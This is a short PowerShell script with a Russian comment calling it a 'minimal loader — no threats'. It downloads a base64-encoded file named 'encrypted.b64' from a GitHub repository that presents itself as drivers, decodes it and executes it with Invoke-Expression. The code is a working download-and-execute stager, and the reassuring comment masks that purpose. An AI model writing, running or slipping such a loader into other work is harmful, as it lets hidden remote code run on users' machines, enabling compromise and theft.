# Минимальный загрузчик — никаких угроз
$url = "https://raw.githubusercontent.com/evilgrou-tech/drivers/refs/heads/main/encrypted.b64"
$e = (New-Object Net.WebClient).DownloadString($url)
$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e))
Invoke-Expression $d